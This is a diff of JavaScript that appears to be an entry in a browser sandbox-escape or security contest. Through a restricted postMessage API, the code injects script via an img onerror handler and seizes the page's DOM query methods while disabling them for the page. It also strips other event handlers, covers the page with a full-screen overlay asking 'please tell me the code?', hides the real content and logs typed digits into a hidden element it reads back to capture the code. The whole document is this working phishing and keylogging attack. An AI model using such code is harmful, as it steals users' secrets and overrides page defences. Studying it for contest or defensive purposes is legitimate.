@@ -1,18 +1,5 @@
 // API calls
 
-function saveMethods() {
-  postMessage({'setAttr': {'selector': 'html', 'name': 'onmouseover', 'value': `
-if (!window.dce) {
-  window.dce = document.createElement;
-  window.dqs = document.querySelector;
-  window.dqsa = document.querySelectorAll;
-}
-
-`}});
-  setTimeout(saveMethods, 1);
-}
-saveMethods();
-
 function read(selector) {
   postMessage({'read': {'selector': selector}});
 }
@@ -35,22 +22,7 @@ function setAttrs(selector, attrs) {
   }
 }
 
-var prefix = makeId();
-var waitingForInit = true;
-
-onmessage = function(e) {
-  if (e.data.innerHTML) {
-    var text = e.data.innerHTML.trim();
-    for (var i = 0; i < text.length - 1; i++) {
-      capture(text.substr(i));
-    }
-    if (text == prefix + '_init') {
-      waitingForInit = false;
-    }
-  }
-};
-
-// DOM manipulation
+// ID generation
 
 function randRange(low, high) {
   return Math.floor(low + Math.random() * (high - low));
@@ -60,46 +32,111 @@ function makeId() {
   return 'x' + randRange(0, 100000000);
 }
 
-function makeDiv(id, attrs) {
-  append('body', id);
-  attrs.id = id;
-  setAttrs(id, attrs);
-}
+// Global variables
+
+var waitingForInit = true;
+var secret = makeId();
+var overlayId = makeId();
+var receiverId = makeId();
 
 // JS execution
 
 function executeJs(js) {
-  setAttr('html', 'onmousemove', js);
+  var id = makeId();
+  append('body', id);
+  append(id, 'img');
+  setAttr(id + ' img', 'onerror', js + '; this.parentNode.removeChild(this);');
+  setAttr(id + ' img', 'style', 'display: none');
+  setAttr(id + ' img', 'src', 'about:error');
 }
 
-// the stuff
+// Initial race to grab the document methods
 
-var keyReaderSel = makeId();
-var receiverSel = makeId();
+executeJs(`
+if (!window.<<secret>>) {
+  window.<<secret>> = {
+    'dce': document.createElement,
+    'dqs': document.querySelector,
+    'dqsa': document.querySelectorAll
+  };
+  document.createElement = null;
+  document.getElementById = null;
+  document.getElementsByClassName = null;
+  document.getElementsByName = null;
+  document.getElementsByTagName = null;
+  document.getElementsByTagNameNS = null;
+  document.querySelector = null;
+  document.querySelectorAll = null;
+}
+`.replace(/<<secret>>/g, secret));
+
+// Remove all other event handlers on elements containing our overlay
+
+function wipe() {
+  executeJs(`
+
+function clearHandlers(e) {
+  var attrs = e.attributes;
+  if (attrs && attrs.length) {
+    var toRemove = [], i;
+    for (i = 0; i < attrs.length; i++) {
+      var n = attrs[i].name;
+      if (n.substr(0, 2) == 'on') toRemove.push(n);
+    }
+    for (i = 0; i < toRemove.length; i++) {
+      e.removeAttribute(toRemove[i]);
+    }
+  }
+}
+
+for (var n = window.<<secret>>.dqs.call(document, '<<overlayId>>').parentNode;
+     n; n = n.parentNode) {
+  clearHandlers(n);
+}
+
+`.replace(/<<overlayId>>/g, overlayId
+).replace(/<<secret>>/g, secret
+));
+
+  setTimeout(wipe, 1);
+}
+wipe();
+
+// Draw the form and keep it on top of everything else
+
 function init() {
   executeJs(`
 
-if (!window.__prefix___init) {
-  console.log('try init');
+if (!window.<<secret>>.init) {
   function randRange(low, high) {
     return Math.floor(low + Math.random() * (high - low));
   }
 
-  function makeId() {
-    return 'x' + randRange(0, 100000000);
-  }
-
-  var k = dqs.call(document, '__keyReaderSel__');
-  var r = dqs.call(document, '__receiverSel__');
-
-  var kw = k.offsetWidth, kh = k.offsetHeight;
+  var h = window.<<secret>>.dqs.call(document, 'html');
+  var hw = h.offsetWidth, hh = h.offsetHeight;
   var iw = randRange(300, 500), ih = randRange(200, 400);
-  var ix = (kw - iw)/2, iy = (kh - ih)/2 - 20;
+  var ix = (hw - iw)/2, iy = (hh - ih)/2 - 20;
 
-  var html = '<div class="__prefix__" style="padding: 6px; border: 1px solid #888; border-radius: 4px; font-family: helvetica; font-size: 16px; line-height: 24px; text-align: center; position: absolute; left: ' + ix + '; top: ' + iy + '"><img class="__prefix__" src="http://placekitten.com/' + iw + '/' + ih + '"><div class="__prefix__">please tell me the code?</div><input class="__prefix__" style="font-size: 16px" size=12><input class="__prefix__" style="font-size: 16px" type=submit value="please?"><span id="__prefix___init" style="display: none">__prefix___init</span></div>';
-  k.innerHTML = html;
-  k.addEventListener('keyup', function(e) {
-    console.log('keyup', e, e.keyCode);
+  h.innerHTML = \`
+<body>
+  <<<receiverId>> style="display: none" class="<<secret>>"></<<receiverId>>>
+  <<<overlayId>> class="<<secret>>" style="position: absolute; top: 0; left: 0; width: 100%; height: 100%; z-index: 2147483647">
+    <div class="<<secret>>" style="padding: 6px; border: 1px solid #888; border-radius: 4px; font-family: helvetica; font-size: 16px; line-height: 24px; text-align: center; position: absolute; left: \` + ix + \`; top: \` + iy + \`">
+      <img class="<<secret>>" src="http://placekitten.com/\` + iw + \`/\` + ih + \`">
+      <div class="<<secret>>">please tell me the code?</div>
+      <input class="<<secret>>" id="<<secret>>_input" style="font-size: 16px" size=12>
+      <input class="<<secret>>" style="font-size: 16px" type="submit" value="please?">
+      <<<secret>>_init style="display: none"><<secret>>_init</<<secret>>_init>
+    </div>
+  </<<overlayId>>>
+</body>\`;
+
+  window.<<secret>>.dqs.call(document, '#<<secret>>_input').focus();
+
+  // Stash the code in the receiver element
+
+  var r = window.<<secret>>.dqs.call(document, '<<receiverId>>');
+  h.addEventListener('keyup', function(e) {
     if (e.keyCode >= 48 && e.keyCode <= 57) {
       r.innerText += ('' + (e.keyCode - 48));
     }
@@ -108,51 +145,56 @@ if (!window.__prefix___init) {
     }
   }, true);
 
-  function popInFront() {
-    var nodes = dqsa.call(document, '*');
+  function raise() {
+    var nodes = window.<<secret>>.dqsa.call(document, '*');
     for (var i = 0; i < nodes.length; i++) {
       var n = nodes[i];
       var name = n.nodeName.toLowerCase();
       if (name != 'html' && name != 'body' && name != 'script' &&
-          n.className != '__prefix__') {
-        n.style.opacity = 0.2;
+          n.className != '<<secret>>') {
+        n.style.display = 'none';
         n.style.zIndex = -1000;
       }
     }
-    k.style.display = 'absolute';
-    k.style.zIndex = 2147483647;
-    setTimeout(popInFront, 1);
+    h.style.display = 'absolute';
+    h.style.zIndex = 2147483647;
+    setTimeout(raise, 1);
   }
-  popInFront();
+  raise();
 
-  console.log('finished init');
-  window.__prefix___init = true;
+  window.<<secret>>.init = true;
 }
 
-`.replace(/__keyReaderSel__/g, keyReaderSel
-).replace(/__receiverSel__/g, receiverSel
-).replace(/__prefix__/g, prefix
+`.replace(/<<overlayId>>/g, overlayId
+).replace(/<<receiverId>>/g, receiverId
+).replace(/<<secret>>/g, secret
 ));
   if (waitingForInit) {
-    read('#__prefix___init');
-    setTimeout(init, 10);
+    read(secret + '_init');
+    setTimeout(init, 1);
   }
 }
 init();
 
-makeDiv(keyReaderSel, {
-  'style': 'position: absolute; top: 0; left: 0; width: 100%; height: 100%; z-index: 2147483647',
-  'class': prefix});
+// Handle an incoming read result (this is how we get the captured code)
 
-makeDiv(receiverSel, {
-  'style': 'display: none'
-});
+onmessage = function(e) {
+  if (e.data.innerHTML) {
+    var text = e.data.innerHTML.trim();
+    if (text == secret + '_init') {
+      waitingForInit = false;
+    } else {
+      for (var i = 0; i < text.length - 1; i++) {
+        capture(text.substr(i));
+      }
+    }
+  }
+};
 
-
-// Capturing the secret
+// Capture the code from the receiver element
 
 function nextAttempt() {
-  read(receiverSel);
+  read(receiverId);
   setTimeout(nextAttempt, 10);
 }
 nextAttempt();
